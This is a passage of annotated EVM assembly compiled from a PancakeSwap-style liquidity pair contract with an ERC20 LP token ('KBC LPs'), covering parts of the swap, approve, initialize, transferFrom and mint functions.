\"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_158\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_158:\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_159\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_159:\n      pop\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap7\n      pop\n        /* \"src/Pair.sol\":13424:13438  uint amount0In */\n      0x00\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":13452:13474  _reserve0 - amount0Out */\n      dup6\n      and\n      dup11\n      swap1\n      sub\n        /* \"src/Pair.sol\":13441:13474  balance0 > _reserve0 - amount0Out */\n      dup4\n      gt\n        /* \"src/Pair.sol\":13441:13540  balance0 > _reserve0 - amount0Out... */\n      tag_160\n      jumpi\n        /* \"src/Pair.sol\":13539:13540  0 */\n      0x00\n        /* \"src/Pair.sol\":13441:13540  balance0 > _reserve0 - amount0Out... */\n      jump(tag_161)\n    tag_160:\n        /* \"src/Pair.sol\":13513:13523  amount0Out */\n      dup10\n        /* \"src/Pair.sol\":13501:13510  _reserve0 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":13501:13523  _reserve0 - amount0Out */\n      and\n      sub\n        /* \"src/Pair.sol\":13489:13497  balance0 */\n      dup4\n        /* \"src/Pair.sol\":13489:13524  balance0 - (_reserve0 - amount0Out) */\n      sub\n        /* \"src/Pair.sol\":13441:13540  balance0 > _reserve0 - amount0Out... */\n    tag_161:\n        /* \"src/Pair.sol\":13424:13540  uint amount0In = balance0 > _reserve0 - amount0Out... */\n      swap1\n      pop\n        /* \"src/Pair.sol\":13550:13564  uint amount1In */\n      0x00\n        /* \"src/Pair.sol\":13590:13600  amount1Out */\n      dup10\n        /* \"src/Pair.sol\":13578:13587  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":13578:13600  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"src/Pair.sol\":13567:13575  balance1 */\n      dup4\n        /* \"src/Pair.sol\":13567:13600  balance1 > _reserve1 - amount1Out */\n      gt\n        /* \"src/Pair.sol\":13567:13666  balance1 > _reserve1 - amount1Out... */\n      tag_162\n      jumpi\n        /* \"src/Pair.sol\":13665:13666  0 */\n      0x00\n        /* \"src/Pair.sol\":13567:13666  balance1 > _reserve1 - amount1Out... */\n      jump(tag_163)\n    tag_162:\n        /* \"src/Pair.sol\":13639:13649  amount1Out */\n      dup10\n        /* \"src/Pair.sol\":13627:13636  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":13627:13649  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"src/Pair.sol\":13615:13623  balance1 */\n      dup4\n        /* \"src/Pair.sol\":13615:13650  balance1 - (_reserve1 - amount1Out) */\n      sub\n        /* \"src/Pair.sol\":13567:13666  balance1 > _reserve1 - amount1Out... */\n    tag_163:\n        /* \"src/Pair.sol\":13550:13666  uint amount1In = balance1 > _reserve1 - amount1Out... */\n      swap1\n      pop\n        /* \"src/Pair.sol\":13709:13710  0 */\n      0x00\n        /* \"src/Pair.sol\":13697:13706  amount0In */\n      dup3\n        /* \"src/Pair.sol\":13697:13710  amount0In > 0 */\n      gt\n        /* \"src/Pair.sol\":13697:13727  amount0In > 0 || amount1In > 0 */\n      dup1\n      tag_164\n      jumpi\n      pop\n        /* \"src/Pair.sol\":13726:13727  0 */\n      0x00\n        /* \"src/Pair.sol\":13714:13723  amount1In */\n      dup2\n        /* \"src/Pair.sol\":13714:13727  amount1In > 0 */\n      gt\n        /* \"src/Pair.sol\":13697:13727  amount0In > 0 || amount1In > 0 */\n    tag_164:\n        /* \"src/Pair.sol\":13676:13787  require(... */\n      tag_165\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x22\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c\n      0x22\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_165:\n        /* \"src/Pair.sol\":13887:13908  uint balance0Adjusted */\n      0x00\n        /* \"src/Pair.sol\":13929:13971  balance0.mul(10000).sub(amount0In.mul(25)) */\n      tag_166\n        /* \"src/Pair.sol\":13953:13970  amount0In.mul(25) */\n      tag_167\n        /* \"src/Pair.sol\":13953:13962  amount0In */\n      dup5\n        /* \"src/Pair.sol\":13967:13969  25 */\n      0x19\n        /* \"src/Pair.sol\":13953:13970  amount0In.mul(25) */\n      0xffffffff\n        /* \"src/Pair.sol\":13953:13966  amount0In.mul */\n      tag_168\n        /* \"src/Pair.sol\":13953:13970  amount0In.mul(25) */\n      and\n      jump\t// in\n    tag_167:\n        /* \"src/Pair.sol\":13929:13948  balance0.mul(10000) */\n      tag_169\n        /* \"src/Pair.sol\":13929:13937  balance0 */\n      dup8\n        /* \"src/Pair.sol\":13942:13947  10000 */\n      0x2710\n        /* \"src/Pair.sol\":13929:13948  balance0.mul(10000) */\n      0xffffffff\n        /* \"src/Pair.sol\":13929:13941  balance0.mul */\n      tag_168\n        /* \"src/Pair.sol\":13929:13948  balance0.mul(10000) */\n      and\n      jump\t// in\n    tag_169:\n        /* \"src/Pair.sol\":13929:13952  balance0.mul(10000).sub */\n      swap1\n        /* \"src/Pair.sol\":13929:13971  balance0.mul(10000).sub(amount0In.mul(25)) */\n      0xffffffff\n        /* \"src/Pair.sol\":13929:13952  balance0.mul(10000).sub */\n      tag_170\n        /* \"src/Pair.sol\":13929:13971  balance0.mul(10000).sub(amount0In.mul(25)) */\n      and\n      jump\t// in\n    tag_166:\n        /* \"src/Pair.sol\":13887:13985  uint balance0Adjusted = (... */\n      swap1\n      pop\n        /* \"src/Pair.sol\":13999:14020  uint balance1Adjusted */\n      0x00\n        /* \"src/Pair.sol\":14041:14083  balance1.mul(10000).sub(amount1In.mul(25)) */\n      tag_171\n        /* \"src/Pair.sol\":14065:14082  amount1In.mul(25) */\n      tag_167\n        /* \"src/Pair.sol\":14065:14074  amount1In */\n      dup5\n        /* \"src/Pair.sol\":14079:14081  25 */\n      0x19\n        /* \"src/Pair.sol\":14065:14082  amount1In.mul(25) */\n      0xffffffff\n        /* \"src/Pair.sol\":14065:14078  amount1In.mul */\n      tag_168\n        /* \"src/Pair.sol\":14065:14082  amount1In.mul(25) */\n      and\n      jump\t// in\n        /* \"src/Pair.sol\":14041:14083  balance1.mul(10000).sub(amount1In.mul(25)) */\n    tag_171:\n        /* \"src/Pair.sol\":13999:14097  uint balance1Adjusted = (... */\n      swap1\n      pop\n        /* \"src/Pair.sol\":14198:14244  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      tag_174\n        /* \"src/Pair.sol\":14233:14243  10000 ** 2 */\n      0x05f5e100\n        /* \"src/Pair.sol\":14198:14228  uint(_reserve0).mul(_reserve1) */\n      tag_175\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":14198:14213  uint(_reserve0) */\n      dup12\n      dup2\n      and\n      swap1\n        /* \"src/Pair.sol\":14198:14228  uint(_reserve0).mul(_reserve1) */\n      dup12\n      and\n      0xffffffff\n        /* \"src/Pair.sol\":14198:14217  uint(_reserve0).mul */\n      tag_168\n        /* \"src/Pair.sol\":14198:14228  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n    tag_175:\n        /* \"src/Pair.sol\":14198:14232  uint(_reserve0).mul(_reserve1).mul */\n      swap1\n        /* \"src/Pair.sol\":14198:14244  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      0xffffffff\n        /* \"src/Pair.sol\":14198:14232  uint(_reserve0).mul(_reserve1).mul */\n      tag_168\n        /* \"src/Pair.sol\":14198:14244  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      and\n      jump\t// in\n    tag_174:\n        /* \"src/Pair.sol\":14136:14174  balance0Adjusted.mul(balance1Adjusted) */\n      tag_176\n        /* \"src/Pair.sol\":14136:14152  balance0Adjusted */\n      dup4\n        /* \"src/Pair.sol\":14157:14173  balance1Adjusted */\n      dup4\n        /* \"src/Pair.sol\":14136:14174  balance0Adjusted.mul(balance1Adjusted) */\n      0xffffffff\n        /* \"src/Pair.sol\":14136:14156  balance0Adjusted.mul */\n      tag_168\n        /* \"src/Pair.sol\":14136:14174  balance0Adjusted.mul(balance1Adjusted) */\n      and\n      jump\t// in\n    tag_176:\n        /* \"src/Pair.sol\":14136:14244  balance0Adjusted.mul(balance1Adjusted) >=... */\n      lt\n      iszero\n        /* \"src/Pair.sol\":14111:14288  require(... */\n      tag_177\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0a\n      0x24\n      dup3\n      add\n      mstore\n      shl(0xb0, 0x50616e63616b653a204b)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_177:\n        /* \"src/Pair.sol\":1244:1245  _ */\n      pop\n      pop\n        /* \"src/Pair.sol\":14309:14358  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_178\n        /* \"src/Pair.sol\":14317:14325  balance0 */\n      dup5\n        /* \"src/Pair.sol\":14327:14335  balance1 */\n      dup5\n        /* \"src/Pair.sol\":14337:14346  _reserve0 */\n      dup9\n        /* \"src/Pair.sol\":14348:14357  _reserve1 */\n      dup9\n        /* \"src/Pair.sol\":14309:14316  _update */\n      tag_179\n        /* \"src/Pair.sol\":14309:14358  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_178:\n        /* \"src/Pair.sol\":14373:14439  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup4\n      swap1\n      mstore\n      dup1\n      dup3\n      add\n      dup14\n      swap1\n      mstore\n      0x60\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup12\n      and\n      swap2\n        /* \"src/Pair.sol\":14378:14388  msg.sender */\n      caller\n      swap2\n        /* \"src/Pair.sol\":14373:14439  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822\n      swap2\n      dup2\n      swap1\n      sub\n      0x80\n      add\n      swap1\n      log3\n      pop\n      pop\n        /* \"src/Pair.sol\":1266:1267  1 */\n      0x01\n        /* \"src/Pair.sol\":1255:1263  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1255:1267  unlocked = 1 */\n      sstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n      jump\t// out\n        /* \"src/ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_48:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":1280:1581  function getReserves()... */\n    tag_54:\n        /* \"src/Pair.sol\":1486:1494  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap3\n      shl(0x70, 0x01)\n        /* \"src/Pair.sol\":1516:1524  reserve1 */\n      dup4\n      div\n      swap1\n      swap2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"src/Pair.sol\":1556:1574  blockTimestampLast */\n      swap1\n      div\n      0xffffffff\n      and\n      swap1\n        /* \"src/Pair.sol\":1280:1581  function getReserves()... */\n      jump\t// out\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_57:\n        /* \"src/ERC20.sol\":2877:2881  bool */\n      0x00\n        /* \"src/ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      tag_182\n        /* \"src/ERC20.sol\":2902:2912  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":2914:2921  spender */\n      dup5\n        /* \"src/ERC20.sol\":2923:2928  value */\n      dup5\n        /* \"src/ERC20.sol\":2893:2901  _approve */\n      tag_183\n        /* \"src/ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_182:\n      pop\n        /* \"src/ERC20.sol\":2946:2950  true */\n      0x01\n        /* \"src/ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_181:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/Pair.sol\":587:608  address public token0 */\n    tag_59:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x08))\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":2478:2752  function initialize(... */\n    tag_62:\n        /* \"src/Pair.sol\":2617:2624  factory */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n        /* \"src/Pair.sol\":2603:2613  msg.sender */\n      caller\n        /* \"src/Pair.sol\":2603:2624  msg.sender == factory */\n      eq\n        /* \"src/Pair.sol\":2595:2647  require(msg.sender == factory, \"Pancake: FORBIDDEN\") */\n      tag_185\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x12\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x71, 0x2830b731b0b5b29d102327a92124a22222a7)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_185:\n        /* \"src/Pair.sol\":2677:2683  token0 */\n      0x08\n        /* \"src/Pair.sol\":2677:2693  token0 = _token0 */\n      dup1\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      not(sub(shl(0xa0, 0x01), 0x01))\n      swap2\n      dup3\n      and\n      or\n      swap1\n      swap2\n      sstore\n        /* \"src/Pair.sol\":2703:2709  token1 */\n      0x09\n        /* \"src/Pair.sol\":2703:2719  token1 = _token1 */\n      dup1\n      sload\n      swap4\n      swap1\n      swap5\n      and\n      swap3\n      and\n      swap2\n      swap1\n      swap2\n      or\n      swap1\n      swap2\n      sstore\n        /* \"src/Pair.sol\":2729:2735  taxfee */\n      0x0a\n        /* \"src/Pair.sol\":2729:2745  taxfee = _taxfee */\n      sstore\n        /* \"src/Pair.sol\":2478:2752  function initialize(... */\n      jump\t// out\n        /* \"src/ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_64:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_67:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3239:3254  allowance[from] */\n      dup4\n      and\n        /* \"src/ERC20.sol\":3219:3223  bool */\n      0x00\n        /* \"src/ERC20.sol\":3239:3254  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3239:3248  allowance */\n      0x02\n        /* \"src/ERC20.sol\":3239:3254  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":3255:3265  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3239:3266  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"src/ERC20.sol\":3239:3281  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"src/ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_187\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3327:3342  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3327:3336  allowance */\n      0x02\n        /* \"src/ERC20.sol\":3327:3342  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":3343:3353  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3327:3354  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"src/ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      tag_188\n      swap1\n        /* \"src/ERC20.sol\":3376:3381  value */\n      dup4\n        /* \"src/ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"src/ERC20.sol\":3327:3358  allowance[from][msg.sender].sub */\n      tag_170\n        /* \"src/ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_188:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3297:3312  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/ERC20.sol\":3297:3306  allowance */\n      0x02\n        /* \"src/ERC20.sol\":3297:3312  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/ERC20.sol\":3313:3323  msg.sender */\n      caller\n        /* \"src/ERC20.sol\":3297:3324  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"src/ERC20.sol\":3297:3395  allowance[from][msg.sender] = allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"src/ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_187:\n        /* \"src/ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      tag_189\n        /* \"src/ERC20.sol\":3425:3429  from */\n      dup5\n        /* \"src/ERC20.sol\":3431:3433  to */\n      dup5\n        /* \"src/ERC20.sol\":3435:3440  value */\n      dup5\n        /* \"src/ERC20.sol\":3415:3424  _transfer */\n      tag_190\n        /* \"src/ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      jump\t// in\n    tag_189:\n      pop\n        /* \"src/ERC20.sol\":3458:3462  true */\n      0x01\n        /* \"src/ERC20.sol\":3108:3469  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_69:\n        /* \"src/ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_71:\n        /* \"src/ERC20.sol\":299:301  18 */\n      0x12\n        /* \"src/ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_73:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"src/ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_76:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":934:966  uint public price0CumulativeLast */\n    tag_78:\n      sload(0x0c)\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":972:1004  uint public price1CumulativeLast */\n    tag_80:\n      sload(0x0d)\n      dup2\n      jump\t// out\n        /* \"src/Pair.sol\":4905:6170  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_83:\n        /* \"src/Pair.sol\":4954:4968  uint liquidity */\n      0x00\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_192\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_192:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/Pair.sol\":1233:1234  0 */\n      dup1\n        /* \"src/Pair.sol\":5023:5036  getReserves() */\n      tag_194\n        /* \"src/Pair.sol\":5023:5034  getReserves */\n      tag_54\n        /* \"src/Pair.sol\":5023:5036  getReserves() */\n      jump\t// in\n    tag_194:\n      pop\n        /* \"src/Pair.sol\":5084:5090  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":5110:5114  this */\n      address\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":4980:5036  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"src/Pair.sol\":5061:5074  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":5084:5090  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"src/Pair.sol\":5077:5101  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":5084:5090  token0 */\n      dup7\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_195\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_195:\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_196\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_196:\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_197\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_197:\n      pop\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":5149:5155  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":5175:5179  this */\n      address\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"src/Pair.sol\":5126:5139  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":5149:5155  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/Pair.sol\":5142:5166  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/Pair.sol\":5077:5116  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":5149:5155  token1 */\n      dup7\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_198\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_198:\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_199\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_199:\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_200\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_200:\n      pop\n        /* \"src/Pair.sol\":5142:5181  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"src/Pair.sol\":5191:5203  uint amount0 */\n      0x00\n        /* \"src/Pair.sol\":5206:5229  balance0.sub(_reserve0) */\n      tag_201\n        /* \"src/Pair.sol\":5206:5214  balance0 